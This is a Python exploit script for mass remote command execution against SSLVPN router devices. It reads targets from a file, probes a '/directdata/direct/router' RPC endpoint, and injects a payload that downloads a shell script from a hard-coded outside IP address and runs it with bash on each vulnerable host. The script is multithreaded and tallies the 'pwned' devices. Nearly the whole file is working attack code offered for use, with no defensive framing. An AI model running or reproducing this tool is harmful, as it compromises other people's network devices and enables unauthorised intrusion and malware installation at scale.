#!/usr/bin/env python3
"""
SSLVPN Router RCE Exploit
Simple and direct - finds vulnerable devices and executes your payload script.
"""

import urllib3
import json
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SERVER = "72.62.37.166"
TIMEOUT = 8
MAX_WORKERS = 10

# Simple payload - just download and run 1.sh
PAYLOAD = f"wget http://{SERVER}/1.sh -O /tmp/1.sh;chmod 777 /tmp/1.sh;bash /tmp/1.sh"


class Exploiter:
    def __init__(self):
        self.vulnerable = []
        self.exploited = []
    
    def normalize_url(self, url: str) -> str:
        if not url.startswith(('http://', 'https://')):
            return f"https://{url}"
        return url.rstrip('/')
    
    def check_vulnerable(self, target: str) -> bool:
        endpoint = f"{target}/directdata/direct/router"
        data = {
            "action": "SSLVPN_Resource",
            "method": "deleteImage",
            "data": [{"data": ["test"]}],
            "type": "rpc",
            "tid": 17
        }
        
        try:
            r = requests.post(
                endpoint,
                headers={'Content-Type': 'application/json'},
                data=json.dumps(data),
                verify=False,
                timeout=TIMEOUT
            )
            return r.status_code == 200 and "SSLVPN_Resource" in r.text
        except:
            return False
    
    def exploit_target(self, target: str) -> bool:
        endpoint = f"{target}/directdata/direct/router"
        exploit = {
            "action": "SSLVPN_Resource",
            "method": "deleteImage",
            "data": [{"data": [PAYLOAD]}],
            "type": "rpc",
            "tid": 17
        }
        
        try:
            r = requests.post(
                endpoint,
                headers={'Content-Type': 'application/json'},
                data=json.dumps(exploit),
                verify=False,
                timeout=TIMEOUT
            )
            return r.status_code == 200
        except:
            return False
    
    def scan(self, target: str):
        target = self.normalize_url(target)
        
        if not self.check_vulnerable(target):
            print(f"[-] {target}")
            return
        
        print(f"[+] VULNERABLE: {target}")
        self.vulnerable.append(target)
        
        if self.exploit_target(target):
            print(f"[★] EXPLOITED: {target}")
            self.exploited.append(target)
    
    def run(self, targets):
        print(f"\n{'='*60}")
        print(f"SSLVPN RCE Exploit Scanner")
        print(f"Server: {SERVER}")
        print(f"{'='*60}\n")
        
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(self.scan, t) for t in targets]
            
            for i, future in enumerate(as_completed(futures), 1):
                future.result()
                if i % 20 == 0:
                    elapsed = time.time() - start
                    rate = i / elapsed if elapsed > 0 else 0
                    print(f"\nScanned: {i}/{len(targets)} | Rate: {rate:.1f}/s\n")
        
        elapsed = time.time() - start
        
        print(f"\n{'='*60}")
        print(f"Total: {len(targets)}")
        print(f"Vulnerable: {len(self.vulnerable)}")
        print(f"Exploited: {len(self.exploited)}")
        print(f"Time: {elapsed:.2f}s")
        print(f"{'='*60}\n")
        
        if self.exploited:
            print(f"[★] PWNED ({len(self.exploited)}):")
            for t in self.exploited:
                print(f"  {t}")


def main():
    try:
        with open("skid.txt", 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except:
        print("[!] Error reading skid.txt")
        sys.exit(1)
    
    if not targets:
        print("[!] No targets")
        return
    
    print(f"[*] Loaded {len(targets)} targets\n")
    
    exploiter = Exploiter()
    exploiter.run(targets)


if __name__ == "__main__":
    main()